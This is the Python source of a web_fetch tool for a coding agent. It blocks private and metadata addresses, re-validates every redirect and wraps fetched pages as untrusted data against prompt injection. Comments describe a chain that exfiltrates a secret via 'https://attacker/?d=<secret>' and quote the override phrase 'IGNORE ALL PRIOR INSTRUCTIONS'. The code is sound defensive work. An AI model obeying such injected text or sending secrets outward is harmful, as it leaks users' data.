"""web_fetch — GET one URL, strip HTML to text, truncate."""
from __future__ import annotations

import ipaddress
import re
import socket
from urllib.parse import urljoin, urlsplit

from .base import ToolContext

SCHEMA = {
    "type": "function",
    "function": {
        "name": "web_fetch",
        "description": (
            "Fetch the content of a specific URL. Unlike web_search (which "
            "returns a list of links), this retrieves and returns the body "
            "of one page — typically an API doc, GitHub README, blog post, "
            "or error-message forum thread. HTML is stripped to readable "
            "text. Truncated at 10 K chars."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Full URL, e.g. https://example.com/docs/api"},
            },
            "required": ["url"],
        },
    },
}


_LIMIT = 10000

# Redirect budget. We follow manually (see `execute`) so the host check
# re-runs on every hop; httpx's own follow_redirects would check only
# the first URL, letting a public page 302 straight into 127.0.0.1.
_MAX_REDIRECTS = 5


def _is_blocked_ip(ip: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
    """True for any address the agent must never reach.

    The model picks the host here and the tool never prompts, so this is
    both an SSRF sink (cloud metadata at 169.254.169.254, admin panels on
    localhost, the user's LAN) and the outbound half of a prompt-injection
    chain — read a secret, then fetch `https://attacker/?d=<secret>`. We
    can't stop the second half by IP, but we can stop the first.
    """
    if ip.is_loopback or ip.is_link_local or ip.is_private:
        return True
    if ip.is_reserved or ip.is_multicast or ip.is_unspecified:
        return True
    # CGNAT 100.64.0.0/10 — not covered by is_private, and commonly
    # routes to carrier / tailnet infrastructure.
    if isinstance(ip, ipaddress.IPv4Address):
        if ip in ipaddress.ip_network("100.64.0.0/10"):
            return True
    else:
        # fc00::/7 unique-local; is_private already covers it on modern
        # Python, but be explicit rather than rely on that.
        if ip in ipaddress.ip_network("fc00::/7"):
            return True
        # IPv4-mapped / 6to4 wrappers around a blocked v4 address.
        mapped = getattr(ip, "ipv4_mapped", None) or getattr(ip, "sixtofour", None)
        if mapped is not None and _is_blocked_ip(mapped):
            return True
    return False


def _check_url(url: str) -> str | None:
    """Validate scheme + resolved host. Returns an error string, or None
    if the URL is safe to request."""
    if not (url.startswith("http://") or url.startswith("https://")):
        return f"Error: url must start with http(s)://; got {url!r}"

    host = (urlsplit(url).hostname or "").strip().rstrip(".")
    if not host:
        return f"Error: url has no host; got {url!r}"

    lowered = host.lower()
    # mDNS / Bonjour names resolve to LAN devices; never resolvable to a
    # public address, so reject by name before touching DNS.
    if lowered == "localhost" or lowered.endswith(".localhost") or lowered.endswith(".local"):
        return f"Error: refusing to fetch local/private host {host!r}"

    # Literal IP in the URL — check it directly, no DNS needed.
    try:
        literal = ipaddress.ip_address(lowered.strip("[]"))
    except ValueError:
        literal = None
    if literal is not None:
        if _is_blocked_ip(literal):
            return f"Error: refusing to fetch local/private host {host!r}"
        return None

    try:
        infos = socket.getaddrinfo(host, None)
    except Exception as e:
        return f"Fetch error: cannot resolve {host!r}: {e}"
    if not infos:
        return f"Fetch error: cannot resolve {host!r}"

    # Reject if ANY resolved address is private — a DNS name that returns
    # both a public and a loopback record must not be a way in.
    for info in infos:
        addr = info[4][0]
        try:
            ip = ipaddress.ip_address(addr.split("%")[0])
        except ValueError:
            continue
        if _is_blocked_ip(ip):
            return f"Error: refusing to fetch local/private host {host!r} ({ip})"
    return None


def execute(ctx: ToolContext, args: dict) -> str:
    import httpx
    url = (args.get("url") or "").strip()
    if not url:
        return "Error: 'url' argument is required."

    final_url = url
    try:
        r = None
        for _hop in range(_MAX_REDIRECTS + 1):
            err = _check_url(final_url)
            if err:
                return err
            r = httpx.get(
                final_url, timeout=15, follow_redirects=False,
                headers={"User-Agent": "localcode/1.0 (coding-agent)"},
            )
            if r.status_code in (301, 302, 303, 307, 308):
                location = r.headers.get("location", "")
                if not location:
                    break
                # Relative Location is legal; resolve against the hop we
                # just made, then re-validate scheme AND host.
                final_url = urljoin(final_url, location)
                continue
            break
        else:
            return f"Fetch error: too many redirects (>{_MAX_REDIRECTS}) starting at {url}"
        if r is None:
            return f"Fetch error: no response for {url}"
        r.raise_for_status()
    except Exception as e:
        return f"Fetch error: {e}"

    content_type = r.headers.get("content-type", "").lower()
    body = r.text
    if "html" in content_type:
        body = re.sub(r"<(script|style)\b[^>]*>.*?</\1\s*>", " ",
                      body, flags=re.DOTALL | re.IGNORECASE)
        body = re.sub(r"<[^>]+>", " ", body)
        body = re.sub(r"&nbsp;", " ", body)
        body = re.sub(r"\s+", " ", body).strip()

    truncated_note = ""
    if len(body) > _LIMIT:
        truncated_note = (
            f"\n\n[... {len(body) - _LIMIT} more chars truncated; "
            f"fetch a more specific URL or search for the section you want ...]"
        )
        body = body[:_LIMIT]

    # Prompt-injection defence: wrap fetched page content in explicit
    # data/instruction separator markers. The web is a high-risk input
    # source — a malicious page could try "IGNORE ALL PRIOR INSTRUCTIONS"
    # directly, or hide it in a fake code block. The wrapper + signature
    # detector in injection_defense.py is our minimum baseline.
    from ..injection_defense import wrap_untrusted
    header = (
        f"URL: {final_url}\nStatus: {r.status_code}\n"
        f"Content-Type: {content_type or '(unknown)'}"
    )
    return f"{header}\n\n{wrap_untrusted(body + truncated_note, source=final_url)}"


def is_concurrency_safe(args: dict) -> bool:
    return True
